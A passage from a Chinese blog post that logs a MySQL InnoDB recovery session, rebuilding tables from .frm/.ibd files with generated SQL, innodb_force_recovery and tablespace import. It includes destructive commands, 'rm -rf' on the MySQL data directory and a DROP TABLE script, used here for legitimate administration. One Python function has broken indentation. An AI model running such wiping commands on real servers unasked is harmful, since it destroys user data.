'&#123;print $9&#125;'|awk -F '.' '&#123;print $1&#125;' &gt; /alidata/cy_table.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> python脚本自动生成建表语句</span></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python /alidata/py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql1.sql </span><br><span class="line">create table base_dict</span><br><span class="line"> (id int);create table biz_advise</span><br><span class="line"> (id int);create table biz_bank</span><br><span class="line"> (id int);create table biz</span><br><span class="line"> (id int);create table biz_gift</span><br><span class="line"> (id int);create table biz_gprs_bind</span><br><span class="line"> (id int);create table biz_gprs_bind_his</span><br><span class="line"> (id int);create table biz_msg_template</span><br><span class="line"> (id int);create table biz_take_bank</span><br><span class="line"> (id int);create table biz_take</span><br><span class="line">省略。。。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入测试表结构</span></span><br><span class="line">[root@toberoot alidata]# mysql -e "show databases"</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">[root@toberoot alidata]# mysql -e "create database cy;"</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; /alidata/cy_sql1.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e "desc cy.sys_res"</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始获取表结构中列的信息</span></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# yes|cp ~/home/cy02/*.frm /alidata/mysql/data/cy/</span><br><span class="line">cp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_advise.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gift.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_msg_template.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wwlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_vip.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_focus.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_walt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_area.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_id_gen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/gprs_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_oauth.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_pay.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_prizen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_recharge.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_item.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_ali.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_return.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_base_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_bug_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd_invoke.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_imgs.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr_val.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_sku.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_onl_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_arg_vals.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct_res.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_res.frm’? [root@toberoot alidata]# </span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line">def desc_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "desc &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    #create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line">    desc_table_test('/alidata/cy_table.txt','/alidata/cy_sql2.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py</span><br><span class="line">[root@toberoot alidata]# head cy_sql2.sql </span><br><span class="line">desc base_dict</span><br><span class="line">;desc biz_advise</span><br><span class="line">;desc biz_bank</span><br><span class="line">;desc biz</span><br><span class="line">;desc biz_gift</span><br><span class="line">;desc biz_gprs_bind</span><br><span class="line">;desc biz_gprs_bind_his</span><br><span class="line">;desc biz_msg_template</span><br><span class="line">;desc biz_take_bank</span><br><span class="line">;desc biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 截取包含列名的报错</span></span><br><span class="line">[root@toberoot alidata]# grep contains  mysql/dataerror.log &gt; cy_error1.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 报错格式如下：</span></span><br><span class="line">2018-05-17T07:58:32.926555Z 3 [Warning] InnoDB: Table cy/base_dict contains 1 user defined columns in InnoDB, but 11 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.555492Z 4 [Warning] InnoDB: Table cy/biz_advise contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.556045Z 4 [Warning] InnoDB: Table cy/biz_bank contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将表名和列数存放至文件中</span></span><br><span class="line">[root@toberoot alidata]# awk '&#123;print $6,$15&#125;' cy_error1.log | awk -F '/' '&#123;print $2&#125;' &gt; cy_table_col.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 根据以上表名和列数生成新的测试表</span></span><br><span class="line">def create_table_col(table_col_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_col_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    # b_list = ['t1 10','t2 20']</span><br><span class="line">    str_list = []</span><br><span class="line">    for table_col_str in b_list:</span><br><span class="line">        table_col_list = table_col_str.split()</span><br><span class="line">table = table_col_list[0]</span><br><span class="line">col = int(table_col_list[1])</span><br><span class="line">        string = "create table &#123;&#125; (".format(table)</span><br><span class="line">        str_list.append(string)</span><br><span class="line">for i in range(1,col+1):</span><br><span class="line">            if i!=col:</span><br><span class="line">                string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">    else:</span><br><span class="line">                string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">    for line in str_list:</span><br><span class="line">        a_file.write(line)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">create_table_col('/alidata/cy_table_col.txt','/alidata/cy_sql3.sql')</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除这些测试表</span></span><br><span class="line">[root@toberoot alidata]# vim py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 60</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 12:12 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 15:44 mysql</span><br><span class="line">-rw-r--r--  1 root  root   1798 May 17 16:17 py_createtable01.py</span><br><span class="line"><span class="meta">#</span><span class="bash">python代码如下：</span></span><br><span class="line">def drop_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">drop_table_test('/alidata/cy_table.txt','/alidata/cy_sql4.sql')</span><br><span class="line">    </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql4.sql </span><br><span class="line">drop table base_dict</span><br><span class="line">;drop table biz_advise</span><br><span class="line">;drop table biz_bank</span><br><span class="line">;drop table biz</span><br><span class="line">;drop table biz_gift</span><br><span class="line">;drop table biz_gprs_bind</span><br><span class="line">;drop table biz_gprs_bind_his</span><br><span class="line">;drop table biz_msg_template</span><br><span class="line">;drop table biz_take_bank</span><br><span class="line">;drop table biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除数据库的时候直接卡死了，原因未知。也没有报错。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">清数据启动服务</span></span><br><span class="line"></span><br><span class="line">ln: failed to create symbolic link ‘/usr/local/mysql/bin/mysqld’: File exists</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot ~]# mysql -e 'create database cy'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始尝试获取表的结构</span></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql3.sql</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">cp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? ^C</span><br><span class="line">[root@toberoot alidata]# yes | cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">[root@toberoot alidata]# ll /alidata/mysql/data/cy/sys_res*</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9106 Aug 14  2017 /alidata/mysql/data/cy/sys_res.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 May 17 16:44 /alidata/mysql/data/cy/sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置文件</span></span><br><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery=6</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 表结构成功获取</span></span><br><span class="line">[root@toberoot alidata]# mysql cy -e 'desc sys_res'</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field  | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| ID     | varchar(64)  | NO   | PRI | NULL    |       |</span><br><span class="line">| NAME   | varchar(32)  | NO   |     | NULL    |       |</span><br><span class="line">| CODE   | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| URI    | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| LOGO   | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| TYPE   | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| PCODE  | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| SORT   | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| STATE  | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| ADMIN  | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| REMARK | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| CRTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">| UPTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">root@MySQL-01 16:49:  [(none)]&gt; select table_name,table_schema from information_schema.tables where table_schema='cy';</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| table_name           | table_schema |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| base_dict            | cy           |</span><br><span class="line">| biz                  | cy           |</span><br><span class="line">| biz_advise           | cy           |</span><br><span class="line">| biz_bank             | cy           |</span><br><span class="line">| biz_gift             | cy           |</span><br><span class="line">| biz_gprs_bind        | cy           |</span><br><span class="line">| biz_gprs_bind_his    | cy           |</span><br><span class="line">| biz_msg_template     | cy           |</span><br><span class="line">| biz_take             | cy           |</span><br><span class="line">| biz_take_bank        | cy           |</span><br><span class="line">| biz_take_wwlt        | cy           |</span><br><span class="line">| biz_take_wx          | cy           |</span><br><span class="line">| biz_vip              | cy           |</span><br><span class="line">| biz_wlt              | cy           |</span><br><span class="line">| biz_wx               | cy           |</span><br><span class="line">| biz_wx_focus         | cy           |</span><br><span class="line">| biz_wx_walt          | cy           |</span><br><span class="line">| cfg_area             | cy           |</span><br><span class="line">| cfg_id_gen           | cy           |</span><br><span class="line">| gprs_model           | cy           |</span><br><span class="line">| mbr                  | cy           |</span><br><span class="line">| mbr_coin             | cy           |</span><br><span class="line">| mbr_coin_chged       | cy           |</span><br><span class="line">| mbr_oauth            | cy           |</span><br><span class="line">| mbr_pay              | cy           |</span><br><span class="line">| mbr_prizen           | cy           |</span><br><span class="line">| mbr_recharge         | cy           |</span><br><span class="line">| mbr_wallet           | cy           |</span><br><span class="line">| mbr_wallet_chged     | cy           |</span><br><span class="line">| ord                  | cy           |</span><br><span class="line">| ord_item             | cy           |</span><br><span class="line">| ord_pay_ali          | cy           |</span><br><span class="line">| ord_pay_coin         | cy           |</span><br><span class="line">| ord_pay_return       | cy           |</span><br><span class="line">| ord_pay_wlt          | cy           |</span><br><span class="line">| ord_pay_wx           | cy           |</span><br><span class="line">| prod                 | cy           |</span><br><span class="line">| prod_base_args       | cy           |</span><br><span class="line">| prod_bug_rpt         | cy           |</span><br><span class="line">| prod_cmd             | cy           |</span><br><span class="line">| prod_cmd_invoke      | cy           |</span><br><span class="line">| prod_coin_rpt        | cy           |</span><br><span class="line">| prod_coin_rpt_log    | cy           |</span><br><span class="line">| prod_gprs_bind       | cy           |</span><br><span class="line">| prod_gprs_bind_his   | cy           |</span><br><span class="line">| prod_instl_imgs      | cy           |</span><br><span class="line">| prod_instl_pos       | cy           |</span><br><span class="line">| prod_instl_pos_model | cy           |</span><br><span class="line">| prod_mod_attr        | cy           |</span><br><span class="line">| prod_mod_attr_val    | cy           |</span><br><span class="line">| prod_mod_sku         | cy           |</span><br><span class="line">| prod_model           | cy           |</span><br><span class="line">| prod_onl_log         | cy           |</span><br><span class="line">| prod_sp_arg_vals     | cy           |</span><br><span class="line">| prod_sp_args         | cy           |</span><br><span class="line">| sys_acct             | cy           |</span><br><span class="line">| sys_acct_res         | cy           |</span><br><span class="line">| sys_res              | cy           |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">58 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 58张表dump备份出来</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy -d &gt; /alidata/new_yc_ddl.sql</span><br><span class="line">[root@toberoot alidata]# tail -n 30 /alidata/new_yc_ddl.sql </span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `sys_res` (</span><br><span class="line">  `ID` varchar(64) NOT NULL COMMENT 'ID',</span><br><span class="line">  `NAME` varchar(32) NOT NULL COMMENT '菜单名称',</span><br><span class="line">  `CODE` varchar(128) NOT NULL COMMENT '菜单编码',</span><br><span class="line">  `URI` varchar(128) NOT NULL COMMENT 'URI',</span><br><span class="line">  `LOGO` varchar(64) DEFAULT NULL COMMENT '图标',</span><br><span class="line">  `TYPE` int(11) NOT NULL COMMENT '@菜单类型（1菜单；2按钮）',</span><br><span class="line">  `PCODE` varchar(64) DEFAULT NULL COMMENT '父菜单',</span><br><span class="line">  `SORT` int(11) DEFAULT '0' COMMENT '排序',</span><br><span class="line">  `STATE` int(11) NOT NULL COMMENT '@@状态（0 无效；1 正常）',</span><br><span class="line">  `ADMIN` int(11) DEFAULT '0' COMMENT '是否管理员菜单（默认0否）',</span><br><span class="line">  `REMARK` varchar(64) DEFAULT NULL COMMENT '备注',</span><br><span class="line">  `CRTIME` datetime NOT NULL COMMENT 'CRTIME',</span><br><span class="line">  `UPTIME` datetime NOT NULL COMMENT 'UPTIME',</span><br><span class="line">  PRIMARY KEY (`ID`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='权限_系统资源';</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2018-05-17 16:52:28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> discard和import命令</span></span><br><span class="line">def discard_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def import_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">discard_table_test('/alidata/cy_table.txt','/alidata/cy_sql5.sql')</span><br><span class="line">import_table_test('/alidata/cy_table.txt','/alidata/cy_sql6.sql')</span><br><span class="line">   </span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成sql</span></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 124</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql5.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql6.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 16:41 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 16:47 mysql</span><br><span class="line">-rw-r--r--  1 root  root  57068 May 17 16:52 new_yc_ddl.sql</span><br><span class="line">-rw-r--r--  1 root  root   2489 May 17 16:55 py_createtable01.py</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql5.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> discard tablespace;alter table biz_advise</span><br><span class="line"> discard tablespace;alter table biz_bank</span><br><span class="line"> discard tablespace;alter table biz</span><br><span class="line"> discard tablespace;alter table biz_gift</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> discard tablespace;alter table biz_msg_template</span><br><span class="line"> discard tablespace;alter table biz_take_bank</span><br><span class="line"> discard tablespace;alter table biz_take</span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql6.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> import tablespace;alter table biz_advise</span><br><span class="line"> import tablespace;alter table biz_bank</span><br><span class="line"> import tablespace;alter table biz</span><br><span class="line"> import tablespace;alter table biz_gift</span><br><span class="line"> import tablespace;alter table biz_gprs_bind</span><br><span class="line"> import tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> import tablespace;alter table biz_msg_template</span><br><span class="line"> import tablespace;alter table biz_take_bank</span><br><span class="line"> import tablespace;alter table biz_take</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# rm -rf /alidata/mysql/data/*</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# mysql &lt; new_yc_ddl.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e 'use cy;select * from sys_res'</span><br><span class="line"></span><br><span class="line">开启强制恢复参数</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql</span><br><span class="line">cy_sql1.sql  cy_sql2.sql  cy_sql3.sql  cy_sql4.sql  cy_sql5.sql  cy_sql6.sql  </span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql </span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 全备份数据</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy &gt; new_cy_all.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看备份的数据量</span></span><br><span class="line">-rw-r--r--  1 root  root   26M May 17 17:13 new_cy_all.sql</span><br></pre></td></tr></table></figure><h2 id="报错汇总"><a href="#报错汇总" class="headerlink" title="报错汇总"></a>报错汇总</h2><h3 id="ERROR-1036-（HY00）"><a href="#ERROR-1036-（HY00）" class="headerlink" title="ERROR 1036 （HY00）"></a>ERROR 1036 （HY00）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br></pre></td></tr></table></figure><p>解决方法：</p><ol><li>检查是否配置文件中存在innodb_force_recovery参数</li><li>如果存在去除或注释掉，重启服务即可</li><li>还不行就清空数据库导入结构后再继续</li></ol><h3 id="ERROR-2013-HY000"><a href="#ERROR-2013-HY000" class="headerlink" title="ERROR 2013 (HY000)"></a>ERROR 2013 (HY000)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 